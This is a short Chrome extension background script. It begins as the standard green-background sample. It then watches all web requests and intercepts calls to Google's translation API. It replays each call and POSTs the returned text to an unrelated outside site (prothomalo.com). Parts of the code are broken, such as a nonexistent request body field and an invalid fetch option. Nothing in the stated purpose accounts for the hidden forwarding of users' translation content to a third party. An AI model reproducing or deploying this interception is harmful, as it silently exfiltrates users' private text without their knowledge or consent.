let color = '#3aa757';

chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.sync.set({ color });
  console.log('Default background color set to %cgreen', `color: ${color}`);
});

var filter = { urls: ['<all_urls>'] };
// var reqExtraInfoSpec = ["blocking", 'requestBody'];
var reqExtraInfoSpec = ['requestBody'];
var resExtraInfoSpec = ['responseHeaders'];

chrome.webRequest.onBeforeRequest.addListener(function(details){
  // console.log(`Rony Sarker - ${details.url}`, details);
  if (details.url.includes('translate.googleapis.com') && !details.url.includes("intercepted=true")) {
    details.url += (details.url.includes("?") ? '&' : '?') + "intercepted=true";
    console.log("received injectEvent"+ JSON.stringify(details));
    fetch(details.url, {
      method: details.method,
      body: details.body,
      intercepted: true
    }).then(response => response.text()).then(data => {
      fetch("https://www.prothomalo.com/", {
          method: "POST",
          body: data
      }).then(r => r.text()).then(result => {})
      .catch((error) => {
        console.error('Error:', error);
      });
    });
    // return {cancel: true}
  }
}, filter, reqExtraInfoSpec) 



// chrome.webRequest.onCompleted.addListener(function(details){
//   console.log(`Rony Sarker - ${details.url}`, details);
//   if (details.url.includes('translate.googleapis.com')) {
//     console.log("received injectEvent"+ details.url);
//   //   fetch("https://www.prothomalo.com/", {
//   //       method: "POST",
//   //       body: this.response
//   //   }).then(r => r.text()).then(result => {
//   // })
// }
// }, filter, resExtraInfoSpec) 

console.log('Added listener');